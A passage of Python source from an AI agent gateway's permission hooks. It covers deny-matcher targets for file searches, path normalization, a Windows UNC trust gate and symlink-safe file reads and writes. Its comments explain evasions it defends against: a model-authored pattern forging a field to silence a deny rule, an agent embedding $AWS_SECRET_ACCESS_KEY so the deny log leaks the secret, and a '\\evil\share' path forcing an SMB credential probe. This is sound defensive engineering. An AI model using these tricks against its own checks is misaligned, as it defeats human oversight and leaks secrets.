        "search_codebase_map",
        "generate_codebase_overview",
        "find_references",
    }
)

# The canonical field carrying the search ROOT. Normalized before emission so one
# spelling of a tree reaches a rule (``_normalize_search_path``); ``max_depth`` is a
# number and needs no such treatment.
_SEARCH_PATH_FIELD = "path"

# The sensitive-path keystone's target extraction — ``TARGET_PATH_KEYS``, the
# ``_TARGET_PATH_MAX_PATHS`` / ``_TARGET_PATH_MAX_NODES`` work caps, the
# ``TargetPaths`` list-subclass carrying ``truncated``, and the bounded,
# depth-aware ``target_paths`` walk — now live in
# ``kiro_crew.platform.tool_paths`` (imported at module top) so the governance
# intersection plane can share the SAME traversal. governance cannot import
# hooks — hooks imports governance — so the walk moved DOWN a layer that both
# import. The names are re-exported from ``hooks`` (see the top-level import)
# unchanged so the keystone consumers below and any caller that imports them
# from ``hooks`` keep working. hooks still applies HARD-DENY semantics to
# ``truncated`` (deny an unverifiable scan); governance applies its own
# permit-by-default policy to the same flag.


# The SCOPE-bearing arguments of a file search as ``(canonical, accepted spellings)``,
# in a fixed order so the synthesized target is deterministic. Scope is the root walked
# and the depth cap — NOT what is being looked for. ``pattern`` and ``include`` are
# model-authored free text and are deliberately NOT emitted: a value can mint a field
# it is not (a pattern containing ``max_depth=`` silences a rule keyed on the absence
# of a cap), and a benign search whose pattern is ``DROP TABLE`` would match a
# command-oriented built-in rule. ``pattern`` is read by the shape gate only.
#
# Each key is read under every spelling kiro-cli may echo — our schemas declare
# snake_case but some calls come back in ``rawInput`` camelCased (the same split
# ``TOOL_PURPOSE_KEYS`` handles) — and emitted under the canonical name, so a rule
# spells each field once. A missed spelling INVERTS a rule rather than weakening it:
# with no ``max_depth`` field, a rule keyed on the absence of a cap fires on a search
# that carries one.
#
# The emitted string is a PUBLIC GRAMMAR: operators author deny rules against these
# field names, this order, and this encoding, so changing any of them silently breaks
# or inverts rules already installed. Treat additions as append-only.
_SEARCH_DENY_ARG_KEYS: tuple[tuple[str, tuple[str, ...]], ...] = (
    (_SEARCH_PATH_FIELD, ("path", "file_path", "filePath")),
    ("max_depth", ("max_depth", "maxDepth")),
)

# What a value must not contribute to the flat ``key=value …`` grammar: ``=`` mints a
# field name and whitespace mints a field boundary, so a value carrying either could
# forge a field the call does not have. ``%`` is escaped first so the encoding is
# unambiguous. It is lossy by design — every whitespace character collapses to ``%20``
# — because a rule matches a shape and never needs the original bytes back.
_SEARCH_DENY_ESCAPES: tuple[tuple[str, str], ...] = (("%", "%25"), ("=", "%3D"))

# The ONLY environment variables substituted into a search root. This is an allowlist
# because the value is MODEL-AUTHORED and the synthesized target is AUDITED: a denied
# target is written to the security event log as the ``operation`` field, so
# ``os.path.expandvars`` — which dereferences any variable — let an agent pick a path
# prefix it knew a rule refuses, append ``$AWS_SECRET_ACCESS_KEY``, and have the deny
# it deliberately triggered write the expanded secret to a readable log. That turns the
# deny matcher itself into an exfiltration primitive.
#
# These names are safe to expand because their value is the home path, which is
# precisely what a home-scoped rule matches on — expanding them reveals nothing the
# target would not already carry. Every other variable stays literal, which under-matches
# rather than over-matches: a rule keyed on an absolute prefix simply does not fire, the
# same fail-safe direction as the relative-root decision.
_SEARCH_HOME_VARS: tuple[str, ...] = ("HOME", "USERPROFILE")


def _encode_search_field(value: str) -> str:
    """Percent-encode the characters a value could use to forge a field."""
    for raw, encoded in _SEARCH_DENY_ESCAPES:
        value = value.replace(raw, encoded)
    return "".join("%20" if ch.isspace() else ch for ch in value)


def _expand_home_vars(value: str) -> str:
    """Substitute only home-denoting variables; leave every other ``$VAR`` literal.

    NOT ``os.path.expandvars``, which dereferences ANY variable. That would turn the
    match target into a carrier for secret VALUES: the deny decision would depend on,
    and every downstream consumer of the target or of a rule hit (refusal text shown
    to the model, audit metadata, operator tooling) could then receive, whatever
    ``$NAME`` an agent chose to embed — a dereference the gate never needs, because
    only the home spellings have a value worth collapsing (the home path is what a
    home rule matches on anyway).

    An UNSET variable is left literal rather than substituted empty: turning
    ``$HOME/x`` into ``/x`` would claim a root-scope walk the tool never performs, and
    a rule matching that broader scope would deny the wrong thing.
    """
    for name in _SEARCH_HOME_VARS:
        expanded = os.environ.get(name)
        if not expanded:
            continue
        for spelling in (f"${name}", f"${{{name}}}", f"%{name}%"):
            value = value.replace(spelling, expanded)
    return value


def _normalize_search_path(value: str) -> str:
    """Canonicalize a search root so one spelling reaches a rule.

    ``~``, ``$HOME``, and ``.``/``..`` segments all name a tree a rule must be able
    to refuse under a single spelling — ``path="~"`` walks the home tree just as
    ``path="/home/alice"`` does, and a rule anchored on the literal root matches
    only the latter. Mirrors what the sensitive-path keystone on this same gate
    already does with ``raw_params['path']``.

    Steps: expand the home variables and ``~``, ``normpath``, rewrite separators to
    ``/``, and collapse a leading ``//`` to ``/`` on POSIX. The separator rewrite keeps
    the emitted grammar OS-independent: ``normpath`` produces backslash separators on
    Windows, so a rule authored with ``/`` — the form the spec documents — would
    silently stop matching there, which fails OPEN. The collapse is POSIX-only
    because POSIX leaves a path beginning with exactly two slashes
    implementation-defined while on Windows a leading ``//`` is a UNC or
    extended-length root that must survive intact.

    Variable expansion is restricted to ``_SEARCH_HOME_VARS`` (see
    ``_expand_home_vars``) because this value is MODEL-AUTHORED and the resulting
    target is audited: expanding arbitrary variables would dereference a secret into
    a log. A non-home variable therefore stays literal, so no rule keyed on an
    absolute prefix matches it — an over-block/under-match in the same fail-safe
    direction as the relative-root decision below.

    DELIBERATELY NOT ``abspath``, which is where this diverges from
    ``governance._norm_item``: absolutizing resolves a relative root against the
    GATEWAY process cwd, which is not the cwd the tool runs in. That misattribution
    cuts both ways — a rule denying the tree actually walked is bypassed, and a rule
    naming the gateway's own tree falsely denies an unrelated search. Governance can
    absorb that because it is a policy intersection where an ungoverned scope
    permits; a hard deny cannot. A relative root therefore stays relative and no
    rule keyed on an absolute prefix matches it (see the residual limits).

    LEXICAL ONLY: no ``realpath``, so a symlink into a denied tree is not resolved.
    The resolved sensitive-path keystone remains the layer that does not depend on
    spelling.

    Never raises: this runs inside the permission gate, where an exception is a crash
    rather than a security decision. On any failure the raw value is returned for the
    caller to encode, which cannot forge a field.

    Only a BARE ``~`` (alone or followed by a separator) is expanded, NOT ``~name``,
    and the home directory comes from the ``_SEARCH_HOME_VARS`` environment values
    ONLY — ``os.path.expanduser`` is never called. Both of its lookup paths reach
    the account database through synchronous NSS calls that can stall the gateway
    event loop for seconds on LDAP-backed hosts: ``~name`` via ``pwd.getpwnam``
    (agent-controlled name), and bare ``~`` with ``HOME`` unset via
    ``pwd.getpwuid``. When no home variable is set the ``~`` stays literal — the
    same contract as an unexpanded ``$HOME`` — so the account database is never
    consulted at all.

    The expansion is built by CONCATENATION, never ``os.path.join``: join discards
    every earlier component when a later one is absolute, so ``~//etc`` (remainder
    ``/etc``) would come out as ``/etc`` — the gate would encode a root-scoped target
    while the search itself resolves under the real home, and a home-scoped deny rule
    would miss. Leading separators are stripped from the remainder instead, which is
    exactly what the shells and search tools this gate fronts do with ``~//etc``
    (``$HOME//etc`` == ``$HOME/etc``). The invariant across this whole branch: agent
    text is never dereferenced through the environment or account database beyond the
    fixed HOME spellings and the current user's own home, and once the home prefix is
    chosen nothing later in the string can displace it.
    """
    try:
        expanded = _expand_home_vars(value)
        if expanded == "~" or expanded.startswith(("~/", "~" + os.sep)):
            home = next((h for h in map(os.environ.get, _SEARCH_HOME_VARS) if h), "")
            if home:
                rest = expanded[1:].lstrip(os.sep + (os.altsep or ""))
                expanded = home + os.sep + rest if rest else home
        path = os.path.normpath(expanded)
    except (OSError, ValueError):
        return value
    path = path.replace(os.sep, "/")
    if os.altsep:
        path = path.replace(os.altsep, "/")
    if os.name != "nt" and path.startswith("//") and not path.startswith("///"):
        path = path[1:]
    return path


def _is_search_shaped(raw_params: Mapping) -> bool:
    """Whether these arguments describe a recursive search.

    A non-empty ``pattern`` string, or an ``operation`` naming a recursive walk that
    carries no pattern of its own.
    """
    pattern = raw_params.get("pattern")
    if isinstance(pattern, str) and pattern:
        return True
    operation = raw_params.get("operation")
    return isinstance(operation, str) and operation in _RECURSIVE_SEARCH_OPERATIONS


def mcp_identity_ref(mcp_server_name: str, mcp_tool_name: str) -> str:
    """The canonical MCP reference governance is asked about, or ``""``.

    Composes the trusted fields straight into the ``@server`` / ``@server/tool``
    form :func:`_match_mcp` documents, instead of encoding them into an
    ``mcp__<server>__<tool>`` title and having the parser split it back apart.
    That round trip is lossy in one direction: the split takes the LAST ``__``,
    so any tool name containing ``__`` re-parses into a different server and
    tool, and a per-tool ceiling written against the real identity stops binding.
    Composing the reference directly cannot mis-split, because the segments are
    joined by ``/`` and neither an MCP server nor an MCP tool name contains one.

    A server with no proven tool yields the server-level ``@server``: a
    ``@server`` rule covers every tool under it, while a ``@server/tool`` rule
    does not match it, so an unproven tool is never denied by a rule naming a
    specific one.
    """
    if not mcp_server_name:
        return ""
    if not mcp_tool_name:
        return f"@{mcp_server_name}"
    return f"@{mcp_server_name}/{mcp_tool_name}"


def _search_deny_target(raw_params: dict | None) -> str:
    """Synthesize a deny-matcher target from a file-search call's scope arguments.

    Both deny tiers match TEXT, and they are handed the display title plus — for a
    shell tool — the raw ``command``. A file-search builtin has neither: its title is
    LLM-authored prose that need not name a path, and it carries no ``command``, so the
    root it walks and whether that walk is depth-capped reach no deny rule. This target
    is what a rule matches instead: ``"<prefix> path=… max_depth=…"`` over the scope
    arguments present, or ``""`` when the arguments are not search-shaped.

    Identification is by ARGUMENT SHAPE, never the title, for the same reason the
    sensitive-path keystone reads ``raw_params['path']``: the arguments are what the
    tool runs with. A ``command`` means a shell tool, already covered by the raw-command
    target.

    Every emitted value is encoded so it cannot forge a field (``_encode_search_field``);
    without that, model-authored text disarms the very rule shape this mechanism exists
    to serve.

    Residual limits, deliberately not closed here — this is a defense-in-depth layer
    over the always-on sensitive-path keystone, not a complete sandbox:
      * The recursive-``operation`` set is enumerated, so a tool that walks a tree under
        some other argument shape produces no target.
      * Only singular path spellings are read; a call passing a ``paths``/``files``
        sequence, or omitting the root entirely to walk the cwd, emits no ``path``
        field and a path-keyed rule does not see it.
      * Path normalization is lexical (see ``_normalize_search_path``): a symlink into a
        denied tree is not resolved, and a RELATIVE root stays relative, so no rule keyed
        on an absolute prefix matches it.
      * What is being searched FOR is never expressible in a rule, only where.
    """
    if not isinstance(raw_params, Mapping) or raw_params.get("command"):
        return ""
    if not _is_search_shaped(raw_params):
        return ""
    fields = [_SEARCH_DENY_PREFIX]
    for canonical, spellings in _SEARCH_DENY_ARG_KEYS:
        for key in spellings:
            value = raw_params.get(key)
            # ``bool`` is an ``int`` subclass; a boolean depth is meaningless and would
            # emit a field no rule can match sensibly.
            if isinstance(value, bool) or not isinstance(value, (str, int)):
                continue
            text = str(value)
            if not text:
                continue
            if canonical == _SEARCH_PATH_FIELD:
                text = _normalize_search_path(text)
            fields.append(f"{canonical}={_encode_search_field(text)}")
            break
    return " ".join(fields)


def _normalize_tool_name(tool_name: str) -> str:
    """Strip display prefixes so hook patterns match the actual tool/command name."""
    for prefix in _TOOL_TITLE_PREFIXES:
        if tool_name.startswith(prefix):
            return tool_name[len(prefix) :]
    return tool_name


def _context_matches(matcher: str, mode: str, context: str) -> bool:
    """Match a hook's matcher against the user message context.

    Modes:
    - ``glob``: fnmatch glob pattern (default, backward-compatible).
    - ``regex``: bounded regex match (case-insensitive) — supports ``\\b``, ``|``, etc.
      Uses ``_bounded_pattern_search`` to prevent ReDoS: the match runs in a
      killable subprocess with a wall-clock timeout, so a catastrophic-backtracking
      pattern cannot freeze the gateway event loop.
    - ``contains``: pipe-delimited substrings, case-insensitive OR.
    """
    if mode == "regex":
        # Prepend (?i) for the default case-insensitive behavior unless the
        # pattern already starts with a GLOBAL flag directive such as (?i).
        # Scoped groups only govern their own body: (?-i:foo)bar intentionally
        # still inherit the matcher default. Suppressing the prefix for every
        # scoped group accidentally made the suffix case-sensitive too.
        pattern = matcher if _has_global_inline_flags(matcher) else f"(?i){matcher}"
        result = _bounded_pattern_search(pattern, context)
        if result is None:
            # Timeout, oversized, or invalid pattern — fail closed (no match)
            logger.warning("Hook regex matcher timed out or invalid: %s", matcher[:80])
            return False
        return result
    elif mode == "contains":
        ctx_lower = context.lower()
        return any(term.strip().lower() in ctx_lower for term in matcher.split("|") if term.strip())
    else:
        # Default: glob (fnmatch)
        return fnmatch.fnmatch(context.lower(), matcher.lower())


def _tool_matches(pattern: str, tool_name: str) -> bool:
    """Match a tool pattern against a tool name.

    Supports: exact, ``prefix*``, ``*suffix``, ``*contains*``, ``*`` (all).
    Case-insensitive.
    """
    if pattern == "*":
        return True
    return fnmatch.fnmatch(tool_name.lower(), pattern.lower())


def is_unc_shape(raw: str) -> bool:
    """True for a UNC-shaped path: two leading separators, either style."""
    return len(raw) >= 2 and raw[0] in "\\/" and raw[1] in "\\/"


_unc_agents_root_cache: tuple[tuple[object, ...], Path | None] | None = None


def _unc_agents_root() -> Path | None:
    """The kiro agents dir as a UNC-gate trusted root, memoized per configuration.

    ``kiro_agents_dir()`` resolves ``KIRO_HOME`` (``Path.resolve()`` --
    filesystem I/O, and on a UNC-shaped override an SMB touch), so consulting
    it per gate check would put blocking I/O -- and exactly the network access
    this gate promises not to make -- on every validation, including async
    callers (review finding on #6728). Memoized on the RAW ``KIRO_HOME`` env
    value plus the accessor and override-hook identities, so the resolution
    runs once per configuration and a monkeypatched or hot-swapped accessor
    invalidates naturally. Mirrors how ``data_home()`` keeps its own hot path
    cheap.

    A computation failure memoizes ``None`` (root absent, gate stays total):
    deterministic-per-configuration beats self-healing here, because the
    failure mode being avoided is a per-call resolve that can block on an SMB
    timeout, and the degraded state -- UNC agent specs refused -- is exactly
    the pre-#6721 status quo. Recovery is an env change or process restart.
    Benign write race under threads: last-writer-wins on an idempotent value.
    """
    global _unc_agents_root_cache
    key: tuple[object, ...] = (
        os.environ.get("KIRO_HOME"),
        _config_paths.kiro_agents_dir,
        getattr(_config_paths, "_agents_dir_override", None),
    )
    cached = _unc_agents_root_cache
    if cached is not None and cached[0] == key:
        return cached[1]
    try:
        # Same admission basis as data_home(): the gateway itself writes the
        # managed agent specs here. The PROJECT-level agents dir is
        # deliberately NOT admitted -- an arbitrary project directory is not
        # gateway-written, so admitting it would widen the trust boundary.
        root: Path | None = _config_paths.kiro_agents_dir()
    except (ValueError, OSError, RuntimeError):
        # A broken home resolution must not take the gate down with it: the
        # two always-computable roots still apply and the function stays
        # total (True/False, never a propagated error).
        root = None
    _unc_agents_root_cache = (key, root)
    return root


# Prime the memo at import time (review finding, #6728 round 3): without this
# the FIRST gate check after process start -- or after a ``KIRO_HOME`` change --
# still pays the resolving accessor on whatever thread asked, which on an async
# validation path is the event loop. Import of this module happens at process
# start, off the loop, so the one resolution per configuration lands there.
# Best-effort: a failure here memoizes root-absent exactly as a lazy miss would.
_unc_agents_root()


def unc_probe_allowed(raw: str) -> bool:
    """Whether a UNC-shaped path may touch the filesystem on Windows.

    A UNC path names a HOST, so resolving or stat-ing untrusted text
    (``\\\\evil\\share\\x.png`` or ``//evil/share/x.png`` echoed in any message
    or query) makes Windows open an SMB connection to that host -- an outbound
    credential probe the attacker controls. Filesystem access is therefore
    restricted to UNC paths under directories this gateway itself writes to:
    the data home (on a roaming profile the home directory is itself a UNC
    share, the one legitimate source of UNC attachment paths), the temp
    directory (channel-side image staging), and the kiro agents directory
    (``apps.bridges._register_agents`` and ``agent.rebuild_agent_config``
    write the managed specs there -- see ``kiro_agents_dir()``'s docstring;
    on a roaming profile it sits on the same UNC share as the data home, and
    without it every user-level agent spec read was silently refused, #6721).
    The comparison is purely lexical (``normpath``/``normcase``) and the
    agents root is memoized per configuration (see ``_unc_agents_root``), so
    this check never touches the network itself.
    """
    try:
        cand = os.path.normcase(os.path.normpath(raw))
    except (ValueError, OSError):
        return False
    roots: tuple[Path, ...] = (_config_paths.data_home(), Path(tempfile.gettempdir()))
    agents_root = _unc_agents_root()
    if agents_root is not None:
        roots += (agents_root,)
    for root in roots:
        rootn = os.path.normcase(os.path.normpath(str(root)))
        if not is_unc_shape(rootn):
            continue
        if cand == rootn or cand.startswith(rootn.rstrip("\\/") + os.sep):
            return True
    return False


def validate_file_path(raw: str) -> str | None:
    """Validate and canonicalize a file path for dashboard file I/O.

    Enforces: the Windows UNC trusted-root gate (BEFORE any resolution --
    ``realpath`` on a UNC path is itself the outbound SMB probe),
    is_sensitive_path(), realpath canonicalization.
    Returns the canonical path or None if rejected.
    """
    if not raw:
        return None
    if os.name == "nt" and is_unc_shape(raw) and not unc_probe_allowed(raw):
        return None
    path = os.path.realpath(os.path.expanduser(raw))
    if is_sensitive_path(path):
        return None
    return path


def safe_read_file(path: str) -> str:
    """Read a file after enforcing ``is_sensitive_path``.

    Canonicalizes the path (following every symlink), re-checks the RESOLVED
    target against ``is_sensitive_path`` — so a symlink pointing into ``~/.aws``
    etc. is refused through the link — then opens the canonical path with
    ``O_NOFOLLOW`` as defense-in-depth against a TOCTOU swap of the final
    component into a symlink after the check.  Opening the
    already-resolved canonical path never rejects a legitimate file (its final
    component is not a symlink by construction), so this only closes the race.

    Raises ``PermissionError`` if the path is sensitive or a symlink race is
    detected. Other read errors (missing file, permission denied) propagate
    unchanged so callers surface accurate messages.
    """
    resolved = os.path.realpath(os.path.expanduser(path))
    if is_sensitive_path(resolved):
        # {resolved!r}, not {resolved}: the resolved target is caller/attacker
        # influenced (a symlink target is chosen by whoever wrote the link) and
        # this text reaches log records via ``exc_info`` — a raw newline in it
        # would forge a second record.
        raise PermissionError(f"Blocked: access to sensitive path: {resolved!r}")
    try:
        fd = os.open(resolved, os.O_RDONLY | getattr(os, "O_NOFOLLOW", 0))
    except OSError as exc:
        # ELOOP on the canonical (symlink-free) path means a concurrent TOCTOU
        # swap of the final component into a symlink — refuse it. Any other
        # OSError (ENOENT, EACCES) is a normal read error; re-raise as-is.
        if exc.errno in (errno.ELOOP, getattr(errno, "EMLINK", -1)):
            raise PermissionError(f"Blocked: refusing to follow symlink at {resolved!r}") from exc
        raise
    with os.fdopen(fd, "r", encoding="utf-8") as fh:
        return fh.read()


MAX_FILE_BYTES = 50 * 1024 * 1024  # 50 MB safety cap


class FileTooLargeError(Exception):
    """Raised when a file exceeds MAX_FILE_BYTES."""


def safe_read_file_bytes(raw: str) -> bytes | None:
    """Read file bytes through centralized is_sensitive_path() enforcement.

    ``validate_file_path`` already canonicalizes via ``realpath`` (following
    symlinks) and rejects sensitive resolved targets, so a workspace symlink
    into ``~/.aws`` etc. is refused before any read.  The final open uses
    ``O_NOFOLLOW`` on the canonical path as defense-in-depth against a TOCTOU
    swap of the final component into a symlink after the check.

    Returns file content as bytes, or None if path is rejected or unreadable.
    """
    path = validate_file_path(raw)
    if path is None:
        return None

    try:
        fd = os.open(path, os.O_RDONLY | getattr(os, "O_NOFOLLOW", 0))
    except OSError:
        return None
    try:
        with os.fdopen(fd, "rb") as fh:
            data = fh.read(MAX_FILE_BYTES + 1)
        if len(data) > MAX_FILE_BYTES:
            raise FileTooLargeError(f"File exceeds {MAX_FILE_BYTES // (1024 * 1024)} MB safety cap")
        return data
    except OSError:
        return None


def safe_read_file_bytes_with_identity(
    raw: str, allowed_identities: set[tuple[int, int]]
) -> bytes | None:
    """Read file bytes, authorizing the OPENED descriptor by inode identity.

    Like :func:`safe_read_file_bytes`, but closes the authorize-then-read TOCTOU
    window for callers that keep a filesystem allowlist. The file is opened ONCE
    with ``O_NOFOLLOW`` and the ``fstat`` identity ``(st_dev, st_ino)`` of that
    very descriptor MUST be in ``allowed_identities`` before any bytes are
    returned. Because authorization and read share one descriptor, a symlink- or
    directory-swap slipped in between ``realpath`` and ``open`` cannot substitute
    an unauthorized file — its inode is not in the allowlist. ``validate_file_path``
    still rejects sensitive resolved targets (``~/.aws`` …) up front, so
    all filesystem reads stay funnelled through this centralized chokepoint.

    Returns bytes on success. Raises :class:`PermissionError` when the opened
    inode is not allowlisted or a final-component symlink swap is detected
    (``O_NOFOLLOW`` → ``ELOOP``), and :class:`FileTooLargeError` when the file
    exceeds ``MAX_FILE_BYTES``. Returns ``None`` when the path is rejected by
    :func:`validate_file_path` or is otherwise unreadable.
    """
    path = validate_file_path(raw)
    if path is None:
        return None

    try:
        fd = os.open(path, os.O_RDONLY | getattr(os, "O_NOFOLLOW", 0))
    except OSError as exc:
        if exc.errno in (errno.ELOOP, getattr(errno, "EMLINK", -1)):
            raise PermissionError(f"Blocked: refusing to follow symlink at {path!r}") from exc
        return None
    try:
        st = os.fstat(fd)
        if (st.st_dev, st.st_ino) not in allowed_identities:
            raise PermissionError("Blocked: file is not in the authorized set")
        with os.fdopen(fd, "rb", closefd=False) as fh:
            data = fh.read(MAX_FILE_BYTES + 1)
        if len(data) > MAX_FILE_BYTES:
            raise FileTooLargeError(f"File exceeds {MAX_FILE_BYTES // (1024 * 1024)} MB safety cap")
        return data
    finally:
        os.close(fd)


def stat_identity(raw: str) -> tuple[int, int] | None:
    """Return ``(st_dev, st_ino)`` of a file through the sensitive-path gate.

    Metadata-only companion to :func:`safe_read_file_bytes_with_identity` for
    callers that must build an inode allowlist from LLM-influenced paths without
    reading content. ``validate_file_path`` canonicalizes via ``realpath`` and
    rejects sensitive resolved targets, so a path that resolves into ``~/.aws``
    etc. is refused (returns ``None``) rather than ``stat``'d — keeping all
    LLM-path filesystem access funnelled through this centralized chokepoint.

    Returns ``(dev, ino)`` or ``None`` if the path is rejected or unstattable.
    """
    path = validate_file_path(raw)
    if path is None:
        return None
    try:
        st = os.stat(path)
    except OSError:
        return None
    return (st.st_dev, st.st_ino)


def safe_read_file_bytes_nolink(
    raw: str,
    within_root: str | None = None,
    *,
    max_bytes: int | None = None,
    allow_truncate: bool = False,
) -> bytes | None:
    """Like :func:`safe_read_file_bytes` but also rejects hardlinked inodes.

    Staging must pin its hardlink check to the SAME inode it reads.
    A caller that lstat()s the path and then opens it by name leaves a race
    window where the file is swapped for a hardlink to a sensitive file
    (e.g. ``~/.aws/config``) between the check and the open. Here the open
    happens first (``O_NOFOLLOW``), then ``fstat()`` on the descriptor —
    the inode that is validated is exactly the inode that is read:
    ``st_nlink > 1`` or a non-regular file type is rejected.

    When ``within_root`` is given, the OPENED descriptor's real path
    (via ``/proc/self/fd`` on Linux, ``fcntl.F_GETPATH`` on macOS, or
    ``GetFinalPathNameByHandleW`` on Windows) must resolve inside that root and
    must not be sensitive. ``O_NOFOLLOW`` only guards the
    FINAL path component — a nested directory swapped for a symlink between
    the tree walk and the open would silently escape the approved tree. The
    fd-path check is pinned to the inode actually opened, so no check-to-use
    window remains. If the fd's real path cannot be determined, fail closed.

    Returns file content as bytes, or None if the path is rejected,
    hardlinked, non-regular, escaping ``within_root``, or unreadable.
    """
    # Callers that pass an explicit limit own the higher-level bound (for
    # example, the importer's trusted 64 MiB SQLite snapshot cap). Keep the
    # default cap for general reads, but do not silently narrow a documented
    # caller-specific limit back to 50 MiB.
    read_limit = MAX_FILE_BYTES if max_bytes is None else max_bytes
    if read_limit < 0:
        raise ValueError("max_bytes must be non-negative")
    path = validate_file_path(raw)
    if path is None:
        return None

    try:
        fd = os.open(path, os.O_RDONLY | getattr(os, "O_NOFOLLOW", 0))
    except OSError:
        return None
    try:
        st = os.fstat(fd)
        if st.st_nlink > 1 or not _stat.S_ISREG(st.st_mode):
            return None
        if within_root is not None:
            fd_real = _fd_real_path(fd)
            if fd_real is None:
                return None  # cannot verify containment -> fail closed
            root_real = os.path.realpath(within_root)
            try:
                contained = os.path.commonpath([fd_real, root_real]) == root_real
            except ValueError:
                contained = False
            if not contained:
                return None  # opened inode escapes the approved tree
            if is_sensitive_path(fd_real):
                return None
        with os.fdopen(fd, "rb") as fh:
            data = fh.read(read_limit + 1)
        fd = -1  # consumed by fdopen
        if len(data) > read_limit:
            # ``allow_truncate`` is for callers whose contract is "show as much
            # as fits" rather than "refuse oversize" -- the artifact store
            # displays a truncated view of a large linked file. The memory bound
            # is unaffected: at most ``read_limit + 1`` bytes were ever read.
            if allow_truncate:
                return data[:read_limit]
            raise FileTooLargeError(f"File exceeds {read_limit // (1024 * 1024)} MB safety cap")
        return data
    except OSError:
        return None
    finally:
        if fd >= 0:
            try:
                os.close(fd)
            except OSError:
                pass


def _pinned_replace(
    raw: str,
    content: str,
    within_root: str | None = None,
    base_hash: str | None = None,
    max_bytes: int | None = None,
) -> str:
    """Overwrite an EXISTING regular file, pinned to the descriptor opened.

    The engine behind :func:`safe_write_file_nolink` (no verification) and
    :func:`verified_replace_file_nolink` (compare-and-swap). Returns an
    outcome string: ``"ok"``, ``"refused"``, and — only when *base_hash* is
    given — ``"conflict"`` (the file's bytes or identity no longer match the
    edit base) or ``"too_large"`` (the file outgrew *max_bytes* since the
    base was read, which by definition is not the state the edit was made
    against).

    When *base_hash* is given, the sha256 of the CURRENT bytes is computed by
    reading the SAME descriptor every other check runs against — one
    ``O_NOFOLLOW`` open, one name resolution, so no by-name re-read can be
    redirected between the verify and the replace. The residual is the data
    race between that read and the rename; it is narrowed twice below (the
    staged-rename identity re-check, and the mtime/size re-check in verify
    mode) and a detected change answers ``"conflict"`` — the newer file wins,
    never the stale edit.

    The write twin of :func:`safe_read_file_bytes_nolink`, and it exists for the
    same reason: validating a path by name and then opening it by name leaves a
    check-to-use window in which the final component -- or an ancestor
    directory -- can be swapped for a symlink, so the write lands on a file the
    caller never authorized. Here the open happens FIRST (``O_NOFOLLOW``), then
    every check runs against that descriptor: ``fstat`` rejects hardlinks and
    non-regular files, and when ``within_root`` is given the OPENED inode's real
    path must resolve inside it and must not be sensitive. Failing to determine
    the fd's real path fails closed.

    The target is opened WITHOUT ``O_CREAT``: a caller mirroring content back to
    a file it previously read has no business creating one, and refusing turns
    "the file moved" into a no-op rather than a surprise new file. The bytes then
    land via an atomic replace (staged sibling + directory-fd-relative rename),
    so a write that fails partway leaves the original untouched instead of a
    truncated file.
    """
    path = validate_file_path(raw)
    if path is None:
        return "refused"
    encoded = content.encode("utf-8")
    try:
        # O_RDWR, not O_WRONLY: the no-dir-fd path below needs to READ the
        # original bytes before truncating so it can put them back if the write
        # fails. Same inode checks either way.
        #
        # O_BINARY is REQUIRED on Windows, where os.open defaults to TEXT mode
        # and os.write then expands every \n to \r\n — so a caller handing this
        # writer exact bytes got a longer file back, and a body just under a
        # size cap lands as a file over it. Absent on POSIX, where getattr
        # yields 0 and there is no text mode to opt out of. Same convention as
        # dashboard/token_secret.py and dashboard/handlers/files.py.
        fd = os.open(
            path,
            os.O_RDWR | getattr(os, "O_NOFOLLOW", 0) | getattr(os, "O_BINARY", 0),
        )
    except OSError:
        return "refused"
    # The descriptor must survive validation (the no-dir-fd path below writes
    # THROUGH it), so it cannot be closed in a blanket `finally`. Validation
    # therefore runs in a nested function: every rejection is a single return
    # here, and the one caller closes the fd on any of them. Returning False
    # directly from inside the checks is what leaked descriptors -- one per
    # rejected update, until the gateway ran out.

    def _validate() -> tuple[int, tuple[int, int]] | None:
        st = os.fstat(fd)
        if st.st_nlink > 1 or not _stat.S_ISREG(st.st_mode):
            return None
        # Carried to the staged file below: a replace that dropped the original's
        # permissions would silently turn a 0644 shared doc or an 0755 script
        # into 0600 and break every other reader (or the execute bit).
        mode = _stat.S_IMODE(st.st_mode)
        if within_root is not None:
            fd_real = _fd_real_path(fd)
            if fd_real is None:
                return None  # cannot verify containment -> fail closed
            root_real = os.path.realpath(within_root)
            try:
                contained = os.path.commonpath([fd_real, root_real]) == root_real
            except ValueError:
                contained = False
            if not contained:
                return None  # opened inode escapes the approved tree
            if is_sensitive_path(fd_real):
                return None

        # (st_dev, st_ino): the staged rename re-resolves `base` against a
        # directory fd, and only this pair proves it lands on the checked file.
        # st_uid vs geteuid: a rename installs a NEW inode owned by THIS
        # process's user, so replacing a file owned by someone else (a
        # group-writable file in a shared project) would silently transfer
        # ownership away from its owner, and only root could chown it back. The
        # caller uses this to pick the write mechanism.
        # getattr, not os.geteuid() directly: it does not exist on Windows, and
        # AttributeError is NOT an OSError -- it would escape this function's
        # `except OSError`, escape the caller, and surface as a 500 with the
        # descriptor leaked and current.html already written. Same reason
        # O_DIRECTORY and fchmod are guarded below; this is the third
        # POSIX-only attribute in this one function.
        return mode, (st.st_dev, st.st_ino)

    try:
        validated = _validate()
    except OSError:
        validated = None
    if validated is None:
        try:
            os.close(fd)
        except OSError:
            pass
        return "refused"
    src_mode, src_ident = validated
    src_state: tuple[int, int] | None = None

    if base_hash is not None:
        # COMPARE half of the compare-and-swap, on the descriptor itself. The
        # bytes hashed here are the bytes of the inode every later check pins,
        # not a second by-name lookup that an ancestor or leaf swap could
        # redirect. Bounded: a file that outgrew the caller's cap since the
        # edit base was read cannot match that base.
        try:
            chunks: list[bytes] = []
            seen = 0
            while True:
                chunk = os.read(fd, 65536)
                if not chunk:
                    break
                seen += len(chunk)
                if max_bytes is not None and seen > max_bytes:
                    # Guarded close, then return: an unguarded close that
                    # raises would fall into the outer except, close the
                    # already-released fd number a second time, and rewrite
                    # this outcome as "refused".
                    try:
                        os.close(fd)
                    except OSError:
                        pass
                    return "too_large"
                chunks.append(chunk)
            if _hashlib.sha256(b"".join(chunks)).hexdigest() != base_hash:
                try:
                    os.close(fd)
                except OSError:
                    pass
                return "conflict"
            # Freshness reference for the pre-rename re-check, captured
            # from the descriptor AFTER the bytes were read: the window
            # it guards is read-to-rename, so a touch landing before the
            # read (or a byte-identical rewrite, already covered by the
            # hash) cannot false-positive it.
            st_after = os.fstat(fd)
            src_state = (st_after.st_mtime_ns, st_after.st_size)
        except OSError:
            try:
                os.close(fd)
            except OSError:
                pass
            return "refused"

    # From here on the descriptor stays OPEN. It is the only handle proven to
    # point at the validated inode, and the no-dir-fd path below writes through
    # it rather than re-resolving the name.

